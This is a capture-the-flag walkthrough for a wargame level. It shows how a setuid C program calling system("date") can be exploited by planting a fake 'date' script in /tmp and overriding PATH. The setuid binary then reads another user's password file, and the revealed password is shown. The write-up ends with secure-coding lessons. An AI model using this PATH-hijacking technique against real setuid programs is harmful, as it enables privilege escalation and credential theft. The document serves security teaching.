## Level 1: don't use the system function in C

When the live CD starts,
you are automatically logged in as user `level00`.
The "message of the day" says:

> In /home/level01/.password is the password of the level01 user.
> Your mission, should you choose to accept it, is to read that
> file and login as level01 to advance to the next level.
> You may find the files in /levels/level01 useful.

All the levels on this CD work roughly the same way:

- The password of each `levelXX` user is stored in a file named `.password` in their home directory.

- The user home directories are well protected:
  only their owners have access (`0700` mode)

- The vulnerable programs and their source code are stored in the `/levels/levelXX` directories.

- The explanation of the level is shown when you login,
  it saved in the file `motd.txt` in the user's home directory.

- The explanation of the level always contains a hint to beat the challange, so it's good to read it carefully.

Let's get started!
Taking the hint from the explanation of the level,
look at the files in the `/levels/level01` directory:

    level00@box:~$ ls -l /levels/level01
    total 32
    -rw-rw-r--  1 level01  level01    69 Mar  9 19:08 Makefile
    -rwsr-xr-x  1 level01  level01  7352 Mar  9 19:08 level01
    -rw-rw-r--  1 level01  level01   152 Mar  9 19:08 level01.c

Notice the user permission `rws` on the file `level01`.
The setuid bit is set,
so when we run this program,
it will have the access permissions of `level01`,
the owner of the file,
instead of our current user.
Let's run it to see what it does:
```
level00@box:~$ /levels/level01/level01
Current time: Tue Sep  3 23:55:54 UTC 2013
```

It simply prints the current date and time.
Let's see how this is implemented in the source code:
```
printf("Current time: ");
fflush(stdout);
system("date");
return 0;
```

Instead of using a native C function to get the date,
the program calls the `system` function to run the `date` command.
We can find how `system` works in `man system`:
it executes the given string by calling `/bin/sh -c`.

Consider how the shell executes a command that is not an absolute path:
for each directory defined in `PATH`,
it checks if there is an executable file,
and it runs the first match.
We can easily exploit this by creating our own script named `date`,
prepend its base directory to `PATH`,
and make it print `/home/level01/.password`.
Here we go:

```
level00@box:~$ echo '#!/bin/cat /home/level01/.password' > /tmp/date
level00@box:~$ chmod +x /tmp/date 
level00@box:~$ PATH=/tmp /levels/level01/level01
Current time: aepeefoo
#!/bin/cat /home/level01/.password
```

Bingo! Now we can login as `level01` using the revealed password.

### Lessons to learn

- Read well the documentation, especially the warnings about usage:
  `man system` warns that it should not be used in setuid programs.

- Don't use the `system` function.
  Or if you must, at least use it only with absolute paths.

- Beware of environment variables that users can manipulate to alter the behavior of your programs.

- Beware of setuid programs.

